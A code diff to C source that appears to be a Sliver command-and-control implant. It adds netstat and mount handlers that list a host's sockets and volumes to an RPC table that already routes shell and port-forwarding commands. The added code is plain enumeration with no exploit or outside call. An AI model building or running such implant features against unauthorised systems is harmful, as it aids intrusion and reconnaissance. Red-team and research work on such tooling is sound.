@@ -610,6 +610,29 @@ static int handle_chtimes_async(const sliver_envelope_t *req, sliver_buf_t *out)
 }
 
 /* --- table ------------------------------------------------------------- */
+/* --- netstat / mount ---------------------------------------------------- */
+static int handle_netstat(const sliver_envelope_t *req, sliver_buf_t *out) {
+  sliver_sock_t socks[512];
+  int n;
+
+  (void)req;
+  n = sliver_net_sockets(socks, (int)(sizeof(socks) / sizeof(socks[0])));
+  LOG_DEBUG("rpc: netstat -> %d entries", n);
+  return sliver_netstat_encode(out, socks, n > 0 ? n : 0,
+                               n < 0 ? "netstat: enumeration failed" : NULL);
+}
+
+static int handle_mount(const sliver_envelope_t *req, sliver_buf_t *out) {
+  sliver_mount_t mounts[26];
+  int n;
+
+  (void)req;
+  n = sliver_fs_mounts(mounts, (int)(sizeof(mounts) / sizeof(mounts[0])));
+  LOG_DEBUG("rpc: mount -> %d volume(s)", n);
+  return sliver_mount_encode(out, mounts, n > 0 ? n : 0,
+                             n < 0 ? "mount: enumeration failed" : NULL);
+}
+
 static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
     {SLIVER_MSG_PWD_REQ, SLIVER_MSG_PWD, sliver_rpc_handle_pwd},
@@ -628,6 +651,8 @@ static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_SHELL_RESIZE_REQ, 0, sliver_rpc_handle_shell_resize},
     {SLIVER_MSG_PORTFWD_REQ, SLIVER_MSG_PORTFWD, sliver_rpc_handle_portfwd},
     {SLIVER_MSG_IFCONFIG_REQ, SLIVER_MSG_IFCONFIG, handle_ifconfig},
+    {SLIVER_MSG_NETSTAT_REQ, SLIVER_MSG_NETSTAT, handle_netstat},
+    {SLIVER_MSG_MOUNT_REQ, SLIVER_MSG_MOUNT, handle_mount},
     {SLIVER_MSG_CP_REQ, SLIVER_MSG_CP, handle_cp_async},
     {SLIVER_MSG_MV_REQ, SLIVER_MSG_MV, handle_mv_async},
     {SLIVER_MSG_CHMOD_REQ, SLIVER_MSG_CHMOD, handle_chmod_async},
@@ -687,19 +712,4 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
